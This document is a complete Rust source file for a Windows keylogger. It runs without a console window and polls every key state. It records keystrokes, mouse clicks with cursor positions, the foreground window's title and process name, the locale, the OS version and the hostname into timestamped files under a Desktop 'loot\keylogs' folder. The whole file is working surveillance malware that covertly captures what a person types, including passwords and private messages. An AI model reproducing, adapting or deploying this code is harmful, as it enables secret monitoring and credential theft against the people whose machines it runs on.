#![windows_subsystem = "windows"]

#[cfg(windows)]
extern crate winapi;

use std::fs::*;
use std::io::*;
use std::env;
use chrono::{DateTime, Timelike, Utc};
use std::fs;

pub fn start(){
    let dir = env::var("userprofile").unwrap_or("none".to_string());
    let now: DateTime<Utc> = Utc::now();
    fs::create_dir_all(format!("{}\\Desktop\\loot\\keylogs\\", dir));
    let mut filename = format!("{}\\Desktop\\loot\\keylogs\\log-{}-{:02}-{:02}-{:02}.log", dir, now.date(), now.hour(), now.minute(), now.second());
    println!("{}", filename);
    let mut output = {
    	match OpenOptions::new().write(true).create(true).open(&filename) {
    		Ok(f) => { f }
    		Err(e) => {
    		panic!("Couldn't create Output file: {}", e);
            }
        }
    };
    run(&mut output);
}

#[cfg(windows)]
fn run(file: &mut File) {
    use winapi::um::winuser::*;
    use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
    use winapi::um::processthreadsapi::OpenProcess;
    use winapi::um::psapi::GetProcessImageFileNameW;
    use winapi::um::winnls::GetUserDefaultLocaleName;
    use winapi::shared::minwindef::DWORD;
    use winapi::ctypes::c_int;
    use std::{thread, time::Duration};
    
    log_header(file);
    let locale = unsafe {
        const LEN: i32 = 85;
        let mut buf = vec![0 as u16; LEN as usize];
        GetUserDefaultLocaleName(buf.as_mut_ptr(), LEN);

        let mut len = 0;
        buf.iter().enumerate().for_each(|(i, c)| {
            if *c == 0 && len == 0 {
                len = i;
            }
        });

        String::from_utf16_lossy(buf[0..len].as_mut())
    };

    log(file, format!("Locale: {}\n", locale));
    log(file, "\nKeylogs:\n".to_string());

    //logging
    loop {
        thread::sleep(Duration::from_millis(10));

        let hwnd = unsafe { GetForegroundWindow() };

        let pid = unsafe {
            let mut p = 0 as DWORD;
            GetWindowThreadProcessId(hwnd, &mut p);
            p
        };

        let handle = unsafe {
            OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
        };

        let filename = unsafe {
            const LEN: u32 = 256;
            let mut buf = vec![0 as u16; LEN as usize];
            GetProcessImageFileNameW(handle, buf.as_mut_ptr(), LEN);

            //find the null terminator
            let mut len = 0;
            buf.iter().enumerate().for_each(|(i, c)| {
                if *c == 0 && len == 0 {
                    len = i;
                }
            });

            String::from_utf16_lossy(buf[0..len].as_mut())
        };

        let title = unsafe {
            let len = GetWindowTextLengthW(hwnd) + 1;
            let mut t = String::from("__NO_TITLE__");

            if len > 0 {
                let mut buf = vec![0 as u16; len as usize];
                GetWindowTextW(hwnd, buf.as_mut_ptr(), len as i32);
                buf.remove(buf.len() - 1);
                t = String::from_utf16_lossy(buf.as_mut());
            }

            t
        };

        let now: DateTime<Utc> = Utc::now();

        for i in 0 as c_int..255 as c_int {
            let key = unsafe { GetAsyncKeyState(i) };

            if (key & 1) > 0 {
                let s = format!("[{:02}:{:02}:{:02}][{}]\n",
                                now.hour(), now.minute(), now.second(), keycode_to_string(i as u8));

                log(file, s);
            }
        }
    }
}

fn log_header(file: &mut File) {
    let os_info = {
        let info = os_info::get();
        format!("OS: type: {}\nVersion: {}\n", info.os_type(), info.version())
    };
    log(file, os_info);

    let hostname = format!("Hostname: {}\n", hostname::get_hostname().unwrap_or("_NO_HOSTNAME_".to_string()));
    log(file, hostname);
}

fn log(file: &mut File, s: String) {
    #[cfg(debug_assertions)] {
        print!("{}", s);
    }

    match file.write(s.as_bytes()) {
        Err(e) => { println!("Couldn't write to log file: {}", e) }
        _ => {}
    }

    match file.flush() {
        Err(e) => { println!("Couldn't flush log file: {}", e) }
        _ => {}
    }
}

fn keycode_to_string(k: u8) -> String {
    if (k >= 65 && k <= 90) || (k >= 48 && k <= 57) {
        return format!("{}", (k as char));
    }

    match k {
        0x01 => { format!("LBUTTON:{}", get_mouse_pos()) }
        0x02 => { format!("RBUTTON:{}", get_mouse_pos()) }
        0x03 => { "CANCEL".to_string() }
        0x04 => { format!("MBUTTON:{}", get_mouse_pos()) }
        0x05 => { format!("XBUTTON1:{}", get_mouse_pos()) }
        0x06 => { format!("XBUTTON2:{}", get_mouse_pos()) }
        0x08 => { "BACK".to_string() }
        0x09 => { "TAB".to_string() }
        0x0C => { "CLEAR".to_string() }
        0x0D => { "RETURN".to_string() }
        0x10 => { "SHIFT".to_string() }
        0x11 => { "CONTROL".to_string() }
        0x12 => { "MENU".to_string() }
        0x13 => { "PAUSE".to_string() }
        0x14 => { "CAPITAL".to_string() }
        0x15 => { "KANA,HANGUEL,HANGUL".to_string() }
        0x17 => { "JUNJA".to_string() }
        0x18 => { "FINAL".to_string() }
        0x19 => { "HANJA,KANJI".to_string() }
        0x1B => { "ESCAPE".to_string() }
        0x1C => { "CONVERT".to_string() }
        0x1D => { "NONCONVERT".to_string() }
        0x1E => { "ACCEPT".to_string() }
        0x1F => { "MODECHANGE".to_string() }
        0x20 => { "SPACE".to_string() }
        0x21 => { "PRIOR".to_string() }
        0x22 => { "NEXT".to_string() }
        0x23 => { "END".to_string() }
        0x24 => { "HOME".to_string() }
        0x25 => { "LEFT".to_string() }
        0x26 => { "UP".to_string() }
        0x27 => { "RIGHT".to_string() }
        0x28 => { "DOWN".to_string() }
        0x29 => { "SELECT".to_string() }
        0x2A => { "PRINT".to_string() }
        0x2B => { "EXECUTE".to_string() }
        0x2C => { "SNAPSHOT".to_string() }
        0x2D => { "INSERT".to_string() }
        0x2E => { "DELETE".to_string() }
        0x2F => { "HELP".to_string() }
        0x5B => { "LWIN".to_string() }
        0x5C => { "RWIN".to_string() }
        0x5D => { "APPS".to_string() }
        0x5F => { "SLEEP".to_string() }
        0x60 => { "NUMPAD0".to_string() }
        0x61 => { "NUMPAD1".to_string() }
        0x62 => { "NUMPAD2".to_string() }
        0x63 => { "NUMPAD3".to_string() }
        0x64 => { "NUMPAD4".to_string() }
        0x65 => { "NUMPAD5".to_string() }
        0x66 => { "NUMPAD6".to_string() }
        0x67 => { "NUMPAD7".to_string() }
        0x68 => { "NUMPAD8".to_string() }
        0x69 => { "NUMPAD9".to_string() }
        0x6A => { "MULTIPLY".to_string() }
        0x6B => { "ADD".to_string() }
        0x6C => { "SEPARATOR".to_string() }
        0x6D => { "SUBTRACT".to_string() }
        0x6E => { "DECIMAL".to_string() }
        0x6F => { "DIVIDE".to_string() }
        0x70 => { "F1".to_string() }
        0x71 => { "F2".to_string() }
        0x72 => { "F3".to_string() }
        0x73 => { "F4".to_string() }
        0x74 => { "F5".to_string() }
        0x75 => { "F6".to_string() }
        0x76 => { "F7".to_string() }
        0x77 => { "F8".to_string() }
        0x78 => { "F9".to_string() }
        0x79 => { "F10".to_string() }
        0x7A => { "F11".to_string() }
        0x7B => { "F12".to_string() }
        0x7C => { "F13".to_string() }
        0x7D => { "F14".to_string() }
        0x7E => { "F15".to_string() }
        0x7F => { "F16".to_string() }
        0x80 => { "F17".to_string() }
        0x81 => { "F18".to_string() }
        0x82 => { "F19".to_string() }
        0x83 => { "F20".to_string() }
        0x84 => { "F21".to_string() }
        0x85 => { "F22".to_string() }
        0x86 => { "F23".to_string() }
        0x87 => { "F24".to_string() }
        0x90 => { "NUMLOCK".to_string() }
        0x91 => { "SCROLL".to_string() }
        0xA0 => { "LSHIFT".to_string() }
        0xA1 => { "RSHIFT".to_string() }
        0xA2 => { "LCONTROL".to_string() }
        0xA3 => { "RCONTROL".to_string() }
        0xA4 => { "LMENU".to_string() }
        0xA5 => { "RMENU".to_string() }
        0xA6 => { "BROWSER_BACK".to_string() }
        0xA7 => { "BROWSER_FORWARD".to_string() }
        0xA8 => { "BROWSER_REFRESH".to_string() }
        0xA9 => { "BROWSER_STOP".to_string() }
        0xAA => { "BROWSER_SEARCH".to_string() }
        0xAB => { "BROWSER_FAVORITES".to_string() }
        0xAC => { "BROWSER_HOME".to_string() }
        0xAD => { "VOLUME_MUTE".to_string() }
        0xAE => { "VOLUME_DOWN".to_string() }
        0xAF => { "VOLUME_UP".to_string() }
        0xB0 => { "MEDIA_NEXT_TRACK".to_string() }
        0xB1 => { "MEDIA_PREV_TRACK".to_string() }
        0xB2 => { "MEDIA_STOP".to_string() }
        0xB3 => { "MEDIA_PLAY_PAUSE".to_string() }
        0xB4 => { "LAUNCH_MAIL".to_string() }
        0xB5 => { "LAUNCH_MEDIA_SELECT".to_string() }
        0xB6 => { "LAUNCH_APP1".to_string() }
        0xB7 => { "LAUNCH_APP2".to_string() }
        0xBA => { "OEM_1".to_string() }
        0xBB => { "OEM_PLUS".to_string() }
        0xBC => { "OEM_COMMA".to_string() }
        0xBD => { "OEM_MINUS".to_string() }
        0xBE => { "OEM_PERIOD".to_string() }
        0xBF => { "OEM_2".to_string() }
        0xC0 => { "OEM_3".to_string() }
        0xDB => { "OEM_4".to_string() }
        0xDC => { "OEM_5".to_string() }
        0xDD => { "OEM_6".to_string() }
        0xDE => { "OEM_7".to_string() }
        0xDF => { "OEM_8".to_string() }
        0xE2 => { "OEM_102".to_string() }
        0xE5 => { "PROCESSKEY".to_string() }
        0xF6 => { "ATTN".to_string() }
        0xF7 => { "CRSEL".to_string() }
        0xF8 => { "EXSEL".to_string() }
        0xF9 => { "EREOF".to_string() }
        0xFA => { "PLAY".to_string() }
        0xFB => { "ZOOM".to_string() }
        0xFC => { "NONAME".to_string() }
        0xFD => { "PA1".to_string() }
        0xFE => { "OEM_CLEAR".to_string() }

        _ => { return format!("CODE_{}", k); }
    }
}

fn get_mouse_pos() -> String {
    use winapi::um::winuser::*;
    use winapi::shared::windef::POINT;

    let pos = unsafe {
        let mut p = POINT { x: -1, y: -1 };
        GetCursorPos(&mut p);
        p
    };

    format!("{},{}", pos.x, pos.y)
}

#[cfg(not(windows))]
fn run(file: &mut File) {
    log_header(file);
    log(file, "This keylogger only works on windows".to_string());
}

